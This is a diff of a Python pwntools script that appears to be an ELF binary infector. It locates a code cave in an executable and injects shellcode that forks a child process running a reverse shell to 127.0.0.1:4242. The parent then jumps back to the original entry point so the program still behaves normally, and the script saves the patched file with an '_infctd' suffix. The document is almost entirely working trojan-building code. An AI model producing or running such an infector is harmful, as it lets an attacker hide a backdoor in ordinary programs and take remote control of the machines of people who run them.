@@ -64,13 +64,17 @@ for seg in e.segments:
 #generate shellcode
 #payload = b"\xeb\x14\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xeb\x13\xe8\xe7\xff\xff\xff\x61\x74\x30\x6d\x31\x63\x5f\x4a\x75\x6e\x4b\x31\x65\x0a\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6"
 
+#rev shell
 payload = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x10\x92\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
 
+jmp_addr = (og_entry 
+            - (cave_off + 24)) # fork + cmp + je + xors + jmp og_e
+jmp_back = b"\xe9" + struct.pack('<i', jmp_addr) # relative jmp
+print(disasm(jmp_back))
+print(jmp_addr)
 """
-	    xor rax, rax
-	    xor rdi, rdi
-	    xor rdx, rdx
-	    xor rsi, rsi
+5 nops to keep place to put jmp to og entry point
+pwnlib doesnt allow me to hardcode relative jmp
 """
 context.arch = 'amd64'
 sc = asm(shellcraft.fork())
@@ -81,11 +85,15 @@ sc += asm(dedent(f"""\
 	    xor rdi, rdi
 	    xor rdx, rdx
 	    xor rsi, rsi
+        nop
+        nop
+        nop
+        nop
+        nop
 
         child:
     """))
 sc += payload
-print(disasm(sc))
 
 if (len(payload) + 5) > cavesz:
     print("Cave is too small to place a payload")
@@ -101,10 +109,14 @@ print("Found cave at {} ; size - {}".format(hex(cave_off), cavesz))
 
 #patch
 jmp_addr = (og_entry 
-            - (cave_off + len(sc) + 5))
+            - (cave_off + 28))
 jmp_back = b"\xe9" + struct.pack('<i', jmp_addr) # relative jmp
-sc += jmp_back
+sc += asm(shellcraft.exit())
+final = sc[:23]
+final += jmp_back
+final += sc[28:]
+print(disasm(final))
 
-elf.mmap[cave_off:cave_off+len(sc)] = sc
+elf.mmap[cave_off:cave_off+len(final)] = final
 elf.save('{}_infctd'.format(sys.argv[1]))
 print('{}_infctd created. Use wisely'.format(sys.argv[1]))
